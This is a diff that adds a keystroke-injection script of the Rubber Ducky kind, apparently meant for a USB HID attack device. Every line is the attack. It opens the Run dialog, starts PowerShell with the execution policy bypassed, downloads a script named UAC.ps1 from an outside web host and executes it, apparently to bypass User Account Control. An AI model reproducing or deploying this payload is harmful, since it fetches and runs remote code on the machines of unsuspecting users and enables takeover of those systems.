@@ -1,0 +1,16 @@
+DELAY 2000
+ESCAPE
+GUI R
+DELAY 400
+STRING powershell -ep bypass
+DELAY 200
+ENTER
+DELAY 200
+STRING powershell (new-object System.Net.WebClient).DownloadFile('http://www.ihack.eu/files/UAC.ps1','UAC.ps1')
+DELAY 200
+ENTER
+DELAY 2000
+STRING powershell .\UAC.ps1
+DELAY 200
+ENTER
+DELAY 4000
